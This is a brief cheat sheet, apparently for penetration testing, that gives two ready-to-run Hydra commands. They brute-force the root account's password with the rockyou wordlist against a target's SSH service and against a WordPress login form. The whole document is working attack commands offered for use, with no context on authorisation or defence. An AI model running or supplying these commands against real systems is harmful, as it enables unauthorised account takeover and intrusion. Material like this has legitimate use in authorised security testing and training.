# Cheatsheet - Password Guessing
## Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh

hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^:Error"
```
